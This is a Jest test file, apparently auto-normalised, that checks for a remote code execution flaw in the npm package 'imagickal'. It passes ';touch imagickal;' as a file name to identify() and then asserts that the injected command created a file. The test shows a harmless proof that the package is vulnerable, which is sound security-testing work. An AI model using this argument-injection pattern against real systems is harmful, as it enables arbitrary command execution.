const v37 = () => {
    const v20 = expect.assertions(2);
    v20;
    const im = require('imagickal');
    const fs = require('fs');
    const path = './imagickal';
    try {
        const v21 = fs.existsSync(path);
        if (v21) {
            const v22 = fs.unlinkSync(path);
            v22;
            const v23 = console.log('File removed:', path);
            v23;
        }
    } catch (err) {
        const v24 = console.error(err);
        v24;
    }
    file_exist = fs.existsSync(path);
    const v25 = expect(file_exist);
    const v26 = v25.toBe(false);
    v26;
    const v27 = im.identify(';touch imagickal;');
    const v28 = err => {
    };
    const v29 = v27.catch(v28);
    const v35 = () => {
        const v30 = console.log('finally!');
        v30;
        file_exist = fs.existsSync(path);
        const v31 = expect(file_exist);
        const v32 = v31.toBe(true);
        v32;
        const v33 = function (err) {
        };
        const v34 = fs.unlink(path, v33);
        v34;
    };
    const v36 = v29.finally(v35);
    return v36;
};
const v38 = test('Remote code execution in imagickal', v37);
v38;